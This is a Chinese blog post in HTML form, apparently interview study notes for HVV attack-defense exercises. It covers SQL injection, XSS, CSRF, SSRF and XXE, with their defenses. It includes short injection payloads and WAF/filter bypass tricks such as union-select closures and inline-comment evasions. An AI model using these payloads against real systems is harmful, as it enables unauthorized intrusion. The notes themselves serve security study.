@@ -1,0 +1,1462 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>hvv面经 | 0000FF's Blog</title><meta name="author" content="0000FF"><meta name="copyright" content="0000FF"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入数据库类型：Oracle数据库 DB2数据库 SQL Server数据库 PostgreSQL数据库 MySQL数据库 Sybase数据库 SQL注入类型：a.从注入方式上看有联合查询注入、报错型注入、布尔型注入、延时注入、堆叠注入这些 b.从数据类型上有：字符型、数字型 c.从注入位置可以分为GET型、POST型、HTTP头部、cookie数据 宽字节注入原理：在数据库设置mysql_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hvv面经">
+<meta property="og:url" content="https://chr1sto4f.github.io/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/index.html">
+<meta property="og:site_name" content="0000FF&#39;s Blog">
+<meta property="og:description" content="SQL注入数据库类型：Oracle数据库 DB2数据库 SQL Server数据库 PostgreSQL数据库 MySQL数据库 Sybase数据库 SQL注入类型：a.从注入方式上看有联合查询注入、报错型注入、布尔型注入、延时注入、堆叠注入这些 b.从数据类型上有：字符型、数字型 c.从注入位置可以分为GET型、POST型、HTTP头部、cookie数据 宽字节注入原理：在数据库设置mysql_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg">
+<meta property="article:published_time" content="2023-02-12T06:37:08.000Z">
+<meta property="article:modified_time" content="2023-02-12T08:34:05.479Z">
+<meta property="article:author" content="0000FF">
+<meta property="article:tag" content="经验">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg"><link rel="shortcut icon" href="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg"><link rel="canonical" href="https://chr1sto4f.github.io/2023/02/12/hvv%E9%9D%A2%E7%BB%8F/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'hvv面经',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-02-12 16:34:05'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/0000ff.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://0000ff-1306704085.cos.ap-nanjing.myqcloud.com/8080d89c2ceb3204.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0000FF's Blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">hvv面经</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-02-12T06:37:08.000Z" title="发表于 2023-02-12 14:37:08">2023-02-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-02-12T08:34:05.479Z" title="更新于 2023-02-12 16:34:05">2023-02-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="hvv面经"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h2><h3 id="数据库类型："><a href="#数据库类型：" class="headerlink" title="数据库类型："></a>数据库类型：</h3><p>Oracle数据库 DB2数据库</p>
+<p>SQL Server数据库 PostgreSQL数据库</p>
+<p>MySQL数据库 Sybase数据库</p>
+<h3 id="SQL注入类型："><a href="#SQL注入类型：" class="headerlink" title="SQL注入类型："></a>SQL注入类型：</h3><p>a.从注入方式上看有联合查询注入、报错型注入、布尔型注入、延时注入、堆叠注入这些</p>
+<p>b.从数据类型上有：字符型、数字型</p>
+<p>c.从注入位置可以分为GET型、POST型、HTTP头部、cookie数据</p>
+<h3 id="宽字节注入原理："><a href="#宽字节注入原理：" class="headerlink" title="宽字节注入原理："></a>宽字节注入原理：</h3><p>在数据库设置mysql_set_charset(“gbk”)即使用GBK编码时，输入字符的ASCII码大于128（到达汉字的范围）会将这个字符以及后面的一个字符当作一个汉字去识别。在转义 ‘ 时，通常是将其转换为&#39;，url编码后为%5c%27，我们如果要绕过，就得把\过滤掉。常用的方法就是在%5c%27之前加%df，由于%df的ASCII码为223，数据库会将%df%5c当成一个汉字“連”，%27成功逃逸。（其中%df可以换成ASCII码大于128的字符）</p>
+<p>特殊情况中，iconv()函数解析错误导致在编码转换时\被吃掉。</p>
+<p>mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ascii码要大于128，才到汉字的范围）</p>
+<p>php的魔术引号(magic_quotes_gpc)开启，会在特殊字符（比如 ‘ , “ , \ , null）前面加 \ ，导致闭合失败。</p>
+<h3 id="二次注入原理："><a href="#二次注入原理：" class="headerlink" title="二次注入原理："></a>二次注入原理：</h3><p>用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点摸样也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。即输入恶意的数据库查询语句时会被转义，但在数据库调用读取语句时又被还原导致语句执行。</p>
+<h3 id="怎样防范sql注入？"><a href="#怎样防范sql注入？" class="headerlink" title="怎样防范sql注入？"></a>怎样防范sql注入？</h3><p>a.使用API，对输入的数据长度进行限制</p>
+<p>b.关键字过滤，比如：select、insert、order</p>
+<p>c.对参数携带的特殊字符进行转义和过滤</p>
+<p>d.最好的还是预编译：就是sql语句被数据库编译和优化后运行的语句以参数的形式进行查询，即使有敏感字符传递也会被参数化</p>
+<p>e.建立白名单，使恶意SQL语句无效化</p>
+<h3 id="Sql注入函数"><a href="#Sql注入函数" class="headerlink" title="Sql注入函数"></a>Sql注入函数</h3><p>Group_concat():将select的查询结果全部显示出来，占一个显示位</p>
+<p>select version（）：查询MySQL版本</p>
+<p>select user（）：查询数据库用户名</p>
+<p>select database（）：查询数据库名</p>
+<p>select @@datadir()：查询数据库的绝对路径</p>
+<p>select @@version_compile_os:查询操作系统版本</p>
+<p>select current_user():查询当前用户</p>
+<p>Order by: 找列的数量</p>
+<p>Union select:联合查询（联合查询的条件是前一条语句查询不到且字段数与前一条语句的查询字段数一致）报错注入函数</p>
+<h3 id="报错函数："><a href="#报错函数：" class="headerlink" title="报错函数："></a>报错函数：</h3><p>都是选择某个特定条件，然后返回到数据库，如果符合条件就会按照你的特殊条件来显示</p>
+<p>concat()函数：用于将多个字符串连接成一个字符串</p>
+<p>floor(x) 函数：返回小于 x 的最大整数值</p>
+<p>rand()函数调：用可以在0和1之间产生一个随机数</p>
+<p>group by语句：根据一个或多个列对结果集进行分组</p>
+<p>updatexml(目标xml文档，xml路径，更新的内容)：更新xml文档的函数，xpath_expr： 需要更新的xml路径(Xpath格式)</p>
+<p>new_xml： 更新后的内容</p>
+<p>此函数用来更新选定XML片段的内容，将XML标记的给定片段的单个部分替换为 xml_target 新的XML片段 new_xml ，然后返回更改的XML。xml_target替换的部分 与xpath_expr 用户提供的XPath表达式匹配。</p>
+<p>extractvalue(目标xml文档，xml路径)：对XML文档进行查询的函数，一个XML标记片段 xml_frag和一个XPath表达式 xpath_expr（也称为 定位器）; 它返回CDATA第一个文本节点的text（），该节点是XPath表达式匹配的元素的子元素。第一个参数可以传入目标xml文档，第二个参数是用Xpath路径法表示的查找路径，第二个参数 xml中的位置是可操作的地方，xml文档中查找字符位置是用 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;…这种格式，如果我们写入其他格式，就会报错，并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容</p>
+<p>substr()  </p>
+<p>ascii()</p>
+<p>limit：限制显示个数（如：limit 0 2 表示从第一个开始显示两个）</p>
+<p>延时注入函数：</p>
+<p>Getlock：如果存在这个数据库，并且被占用，那么你去查就会排队，需要上一个用户完成操作或者解除数据库锁才可以，因为排队，所以变相的完成了数据库判断</p>
+<p>heavyquery</p>
+<p>ungetlock</p>
+<h3 id="基本绕过方法"><a href="#基本绕过方法" class="headerlink" title="基本绕过方法"></a>基本绕过方法</h3><p><strong>1.大小写</strong></p>
+<p><strong>2.双写</strong></p>
+<p><strong>3.编码，如URLEncode编码，ASCII编码绕过</strong></p>
+<p><strong>4.内敛注释</strong></p>
+<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">\<span class="number">1.</span> 用注释替换空格</span><br><span class="line"></span><br><span class="line">\<span class="number">2.</span> <span class="keyword">select</span><span class="comment">/***\*/</span><span class="keyword">user</span>,password<span class="operator">/</span>\<span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">*</span><span class="operator">/</span><span class="keyword">from</span> <span class="comment">/**/</span>users;</span><br><span class="line"></span><br><span class="line">\<span class="number">3.</span> <span class="number">2.</span>空格url编码<span class="operator">%</span><span class="number">20</span></span><br><span class="line"></span><br><span class="line">\<span class="number">4.</span> <span class="number">3.</span>两个空格代替一个空格</span><br><span class="line"></span><br><span class="line">\<span class="number">5.</span> <span class="number">4.</span>用Tab代替空格</span><br><span class="line"></span><br><span class="line">\<span class="number">6.</span> <span class="number">5.</span><span class="operator">%</span>a0<span class="operator">=</span>空格</span><br><span class="line"></span><br><span class="line">\<span class="number">7.</span> <span class="number">6.</span>如果空格被过滤，括号没有被过滤，可以用括号绕过</span><br><span class="line"></span><br><span class="line">\<span class="number">8.</span> <span class="keyword">select</span>(<span class="keyword">user</span>())<span class="keyword">from</span> dual <span class="keyword">where</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>)<span class="keyword">and</span>(<span class="number">2</span><span class="operator">=</span><span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">\<span class="number">9.</span> <span class="number">7.</span>回车</span><br></pre></td></tr></table></figure>
+
+<h3 id="引号绕过-使用十六进制-宽字节注入"><a href="#引号绕过-使用十六进制-宽字节注入" class="headerlink" title="引号绕过 使用十六进制 宽字节注入"></a>引号绕过 使用十六<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BF%9B%E5%88%B6&spm=1001.2101.3001.7020">进制</a> 宽字节注入</h3><h3 id="逗号绕过-使用join"><a href="#逗号绕过-使用join" class="headerlink" title="逗号绕过 使用join"></a>逗号绕过 使用join</h3><p><strong>or and xor not绕过</strong></p>
+<ul>
+<li><p><input disabled="" type="checkbox"> 
+\1. 利用符号替换and &#x3D; &amp;&amp; or&#x3D;|| xor&#x3D;| not&#x3D;!</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+\2. 2.在敏感词中添加注释：an&#x2F;**&#x2F;d</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+\3. 3.双写绕过oorr</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+\4. 4.大小写变形</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+\5. 5.编码</p>
+</li>
+</ul>
+<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p><strong>1.</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">or</span> ‘<span class="number">1</span>’<span class="operator">=</span>‘<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>** 即虽然无法使用注释符，但是可以闭合掉他 或者：**</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>’ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,‘<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>2.最后添加or 1’</strong></p>
+<p><strong>3.最后添加 and ‘1’&#x3D;’1</strong></p>
+<p><strong>等于号绕过</strong></p>
+<ul>
+<li><input disabled="" type="checkbox"> 1.使用like</li>
+<li><input disabled="" type="checkbox"> 2.使用!&lt;&gt;,因为&lt;&gt;是不等于</li>
+<li><input disabled="" type="checkbox"> 3.regrep (正则表达匹配)</li>
+</ul>
+<p><strong>&lt;&gt;被过滤</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>greatest(),least()</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>strcmp(str1,str2),第一个参数小于第二个参数，返回<span class="number">-1</span>，否则为<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span><span class="keyword">in</span>，<span class="keyword">between</span> a <span class="keyword">and</span> b</span><br><span class="line"></span><br><span class="line">hex()、bin()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>ascii()</span><br><span class="line"></span><br><span class="line">sleep()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>benchmark()</span><br><span class="line"></span><br><span class="line">concat_ws()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>group_concat()</span><br><span class="line"></span><br><span class="line">mid()、substr()<span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span><span class="built_in">substring</span>()</span><br><span class="line"></span><br><span class="line"> @<span class="variable">@user</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span> <span class="keyword">user</span>() @<span class="variable">@datadir</span> <span class="operator">=</span><span class="operator">=</span><span class="operator">&gt;</span>datadir()</span><br></pre></td></tr></table></figure>
+
+<p>内联yyds</p>
+<p>在一些被拦截的地方多用&#x2F;*%23*&#x2F;和&#x2F;*!10440%0a*&#x2F;，有奇效。</p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>什么是xss？</p>
+<p>XSS漏洞的原理是：插入语句、改变结果、操纵数据</p>
+<p>本质是：<strong>用户输入的html语句直接输出，包括了使用不正确的方法去验证</strong></p>
+<p>挖掘XSS的第一步是找输入，也就是用户可以操控代码的位置；第二步是找输 出’也就是找到第一步用户输入的代码在网页的何处地方进行了输出；第三步: 构造payload,通过查看源代码，构建出payload。</p>
+<h3 id="攻击点"><a href="#攻击点" class="headerlink" title="攻击点"></a>攻击点</h3><ul>
+<li><p><input disabled="" type="checkbox"> 
+get、post、cookies、</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+反馈与浏览</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+富文本编辑器</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+各类标签插入和自定义</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+用户资料</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+关键词、标签、说明</p>
+</li>
+<li><p><input disabled="" type="checkbox"> 
+文件上传</p>
+</li>
+</ul>
+<h3 id="攻击途径："><a href="#攻击途径：" class="headerlink" title="攻击途径："></a>攻击途径：</h3><p>1.对普通的用户输入页面原样输出</p>
+<p>2.代码区有用户输入的内容</p>
+<p>3.允许用户输入html标签的页面</p>
+<p>4.保存数据并公开的区域,比如个人信息，可造成蠕虫感染</p>
+<h3 id="攻击模式区别："><a href="#攻击模式区别：" class="headerlink" title="攻击模式区别："></a>攻击模式区别：</h3><p>反射型的XSS的恶意脚本存在URL里，存储型XSS的恶意代码存在数据库里。而基于DOM型的XSS攻击中，取出和执行恶意代码由浏览器端完成，属 于前端JavaScript自身的安全漏洞，其他两种XSS都属于服务端的安全漏洞</p>
+<h3 id="XSS的绕过方法"><a href="#XSS的绕过方法" class="headerlink" title="XSS的绕过方法"></a>XSS的绕过方法</h3><ul>
+<li><input disabled="" type="checkbox"> <ol>
+<li>大小写转换；</li>
+</ol>
+</li>
+<li><input disabled="" type="checkbox"> <ol start="2">
+<li>引号的使用；</li>
+</ol>
+</li>
+<li><input disabled="" type="checkbox"> <ol start="3">
+<li>使用 &#x2F; 代替空格；</li>
+</ol>
+</li>
+<li><input disabled="" type="checkbox"> <ol start="4">
+<li>编码绕过(将字符进行十进制或者十六进制转码)；</li>
+</ol>
+</li>
+<li><input disabled="" type="checkbox"> 5.双写绕过；</li>
+<li><input disabled="" type="checkbox"> 6.使用制表符 换行符和回车符</li>
+<li><input disabled="" type="checkbox"> 7.使用 IMG 源</li>
+</ul>
+<h3 id="怎样防范？"><a href="#怎样防范？" class="headerlink" title="怎样防范？"></a>怎样防范？</h3><p>主要就是过滤输入和转义输出</p>
+<p>1.比如说对用户提交的url、http头、post数据进行输入验证</p>
+<p>2.输出的话，比如说对用户输出的内容使用标签，标签内的内容会直接显示</p>
+<p>3.还有就是严格控制字符输入字数</p>
+<p>4.或者在脚本执行的代码里杜绝掉用户输入</p>
+<h3 id="XSS攻击如何进行防护"><a href="#XSS攻击如何进行防护" class="headerlink" title="XSS攻击如何进行防护"></a>XSS攻击如何进行防护</h3><p>1）	将HTML元素内容、属性以及URL请求参数、CSS值进行编码</p>
+<p>2）	当编码影响业务时，使用白名单规则进行检测和过滤</p>
+<p>3）	使用W3C提出的CSP （Content Security Policy,内容安全策略），定义域名白</p>
+<p>名单</p>
+<p>4）设置 Cookie 的 HttpOnly 属性</p>
+<h2 id="csrf"><a href="#csrf" class="headerlink" title="csrf"></a>csrf</h2><h3 id="csrf原理是什么？"><a href="#csrf原理是什么？" class="headerlink" title="csrf原理是什么？"></a>csrf原理是什么？</h3><p>跨站请求伪造，就是挟持了当前已经登录的用户程序去做用户非本意的操作，比如说在用户已经登录淘宝的情况下，用户去点开了另一个恶意链接，然后恶意链接就是请求修改用户淘宝密码的，这种情况就是跨站请求伪造</p>
+<h3 id="CSRF攻击一般怎么实现"><a href="#CSRF攻击一般怎么实现" class="headerlink" title="CSRF攻击一般怎么实现"></a>CSRF攻击一般怎么实现</h3><p>1）	最容易实现的是Get请求，一般进入黑客网站后.可以通过设置img的src属 性来自动发起请求</p>
+<p>2）	在黑客的网站中，构造隐藏表单来自动发起Post请求</p>
+<p>3）	通过引诱链接诱惑用户点击触发请求，利用a标签的href</p>
+<h3 id="怎样防范csrf？"><a href="#怎样防范csrf？" class="headerlink" title="怎样防范csrf？"></a>怎样防范csrf？</h3><p>1.同源策略，检查referer字段，拒绝非本站的请求，但是要注意referer为空的情况，还有就是部分匹配的情况</p>
+<p>2.另外一个检查token校验码，服务器生成的伪随机数发给用户，后台会拒绝掉错误的请求</p>
+<p>3.针对实际情况,设置关键Cookie的SameSite属性为Strict或Lax</p>
+<p>4.加入二次验证（独立的支付密码）</p>
+<h2 id="Ssrf"><a href="#Ssrf" class="headerlink" title="Ssrf"></a>Ssrf</h2><p>服务器加载外部资源没对目的地址做过滤，只有有网址的地方都可能有ssrf。</p>
+<p>常用协议有<strong>gopher  dist file http https</strong></p>
+<p>初步的探测可以通过</p>
+<ul>
+<li><input disabled="" type="checkbox"> file协议读取本机文件，探测本机的网段。</li>
+<li><input disabled="" type="checkbox"> Dist协议探测端口</li>
+</ul>
+<h3 id="怎么通过ssrf拿shell"><a href="#怎么通过ssrf拿shell" class="headerlink" title="怎么通过ssrf拿shell?"></a>怎么通过ssrf拿shell?</h3><p>可以借助gopher协议探测内网的web服务sql注入，直接在url后面拼接内网的地址，后面加上sql注入语句就行。</p>
+<p>修复:从根源入手(限制资源的地址)、禁用不必要的协议</p>
+<p>位置</p>
+<p>**** ****分享：通过URL地址分享网页内容</p>
+<p>**** ****转码服务</p>
+<p>**** ****在线翻译</p>
+<p>**** ****图片加载与下载：通过URL地址加载或下载图片</p>
+<p>**** ****图片、文章收藏功能</p>
+<p>**** ****未公开的api实现以及其他调用URL的功能</p>
+<h3 id="SSRF漏洞的验证方法"><a href="#SSRF漏洞的验证方法" class="headerlink" title="SSRF漏洞的验证方法"></a>SSRF漏洞的验证方法</h3><p>因为SSRF漏洞是让服务器发送请求的安全漏洞，所以就可以通过抓包分析发送 的请求是否是由服务器所发送的，从而来判断是否存在SSRF漏洞；</p>
+<p>在页面源码中查找访问的资源地址，如果该资源地址类型为</p>
+<p><a target="_blank" rel="noopener" href="http://www.baidu.com/xxx.php?image=(%E5%9C%B0%E5%9D%80)%E7%9A%84%E5%B0%B1%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8">www.baidu.com/xxx.php?image=(地址)的就可能存在</a> SSRF 漏洞。</p>
+<h3 id="SSRF漏洞的成因、防御、绕过"><a href="#SSRF漏洞的成因、防御、绕过" class="headerlink" title="SSRF漏洞的成因、防御、绕过"></a>SSRF漏洞的成因、防御、绕过</h3><p>成因：模拟服务器对其他服务器资源进行请求，没有做合法性验证。</p>
+<p>利用：构造恶意内网IP做探测，或者使用其余所支持的协议对其余服务进行攻 击。</p>
+<p>防御：禁止跳转，限制协议，内外网限制，URL限制。</p>
+<p>绕过：使用不同协议，针对IP, IP格式的绕过，针对URL,恶意URL增添其他</p>
+<p>字符，@之类的。301跳转+dns rebinddingo</p>
+<h2 id="csrf、ssrf、xss区别？"><a href="#csrf、ssrf、xss区别？" class="headerlink" title="csrf、ssrf、xss区别？"></a>csrf、ssrf、xss区别？</h2><p>不同：</p>
+<ul>
+<li><input disabled="" type="checkbox"> xss：是对输入的数据没有足够的过滤，导致客端HTML页面出现恶意代码被执行</li>
+<li><input disabled="" type="checkbox"> csrf：是对用户提交的随机校验和对http请求包内的refer字段校验不严</li>
+<li><input disabled="" type="checkbox"> ssrf：对用户提供的url过于信任，没有做地址限制和更多的检测</li>
+</ul>
+<h2 id="Xxe"><a href="#Xxe" class="headerlink" title="Xxe"></a>Xxe</h2><h3 id="xxe原理是什么？"><a href="#xxe原理是什么？" class="headerlink" title="xxe原理是什么？"></a>xxe原理是什么？</h3><p>xml外部实体注入漏洞：注入是指xml数据在传输过程中被修改，导致服务器哦执行了恶意代码</p>
+<p>外部实体：是指攻击者通过利用外部实体声明来对xml进行修改，插入恶意代码</p>
+<p>xxe漏洞发生在应用程序解析xml输入时，没有禁止外部实体的加载，导致可加载恶意文件，造成文件读取、命令执行</p>
+<p>等攻击</p>
+<h3 id="xxe漏洞触发点往往是："><a href="#xxe漏洞触发点往往是：" class="headerlink" title="xxe漏洞触发点往往是："></a>xxe漏洞触发点往往是：</h3><p><strong>可以上传xml文件的位置、没有对上传的xml文件进行过滤、导致可以上传恶意的型命令、文件</strong></p>
+<h3 id="怎样利用漏洞？"><a href="#怎样利用漏洞？" class="headerlink" title="怎样利用漏洞？"></a>怎样利用漏洞？</h3><ul>
+<li><input disabled="" type="checkbox"> 1.读取本地文件</li>
+<li><input disabled="" type="checkbox"> 2.读取php文件</li>
+<li><input disabled="" type="checkbox"> 3.无回显读取本地文件、内网主机、端口探测</li>
+<li><input disabled="" type="checkbox"> 4.ddos攻击</li>
+</ul>
+<h3 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h3><p>配置xml处理器使用禁用DTD、禁止外部实体解析</p>
